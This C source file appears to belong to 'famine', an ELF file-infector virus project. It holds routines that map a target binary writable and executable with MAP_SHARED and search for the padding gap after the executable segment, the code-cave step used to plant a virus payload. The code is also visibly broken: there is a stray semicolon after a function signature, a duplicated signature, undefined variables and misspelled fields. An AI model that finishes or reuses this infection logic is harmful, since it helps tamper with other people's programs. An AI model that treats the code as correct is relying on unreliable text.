

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>

#include "famine.h"

/*
 * Open the file specified by fname
 * Calculate the size of this file
 * Create a mapping in the virtual address space of the calling process
 * Return the value of the opened fd on success
 * Return -1 on error
 */
int	elf_open_and_map(t_info *elf);
{
	elf->fd = open(fname, O_APPEND | O_RDWR, 0);
	if (elf->fd == -1)
	{
#if DEBUG
		perror("open:");
#endif
		return -1;
	}

	elf->fsize = lseek(elf->fd, 0, SEEK_END);
	if (fsize == -1)
	{
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}
	else if (lseek(elf->fd, 0, SEEK_SET) == -1)
	{
#if DEBUG
		perror("lseek:");
#endif
		return -1;
	}

	elf->mmap = mmap(0, elf->fsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
	if (elf->mmap == MAP_FAILED)
	{
#if DEBUG
		perror("mmap:");
#endif
		return -1;
	}

#if DEBUG
		printf(" + File mapped: %ld at %p\n", elf->fsize, elf->mmap);
#endif
		return elf->fd;
}

Elf64_Phdr *	elf_find_gap(void *data, int fsize, int *p, long *len)
Elf64_Phdr *	elf_find_gap(t_target *target)
{
	Elf64_Phdr *text_seg;
	long		text_end, gap = fsize;

	/* unsigned char or unsigned int ? should be the same */
	elf_seg = (Elf64_Phdr *)((unsigned char *)elf_hdr + (unsigned int)elf_hdr->e_phoff);

	for(int i = 0; i < target.elf_hdr.e_phnum; i++)
	{
		/* PF_X | PF_W == 0x011 ie write and execute permissions */
		if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & (PF_X | PF_W))
		{
#if DEBUG
			printf(" + Found .text segment (#%d)\n", i);
#endif
			text_seg = elf_seg;
			text_end = elf_seg->p_offset + elf_seg->p_filesz;
		}
		else if (elf_seg->p_type == PT_LOAD && (elf_seg->p_offset - text_end) < gap)
		{
#if DEBUG
			printf("    * Found LOAD segment (#%d) close to .text (offset: 0x%x)",
					i, (unsigned int)elg_seg->p_offset);
#endif
			gap = elf_seg->_offset - text_end;
		}
		elf_seg = (Elf64_Phdr *)((unsigned char*)elf_seg + (unsigned int)elf_hdr->e_phentsize);
	}

	*p = text_end;
	*len = gap;

#if DEBUG
	printf(" + .text segment gap at offset 0x%x(0x%x bytes available)\n", text_end, gap);
#endif

	return text_seg;
}
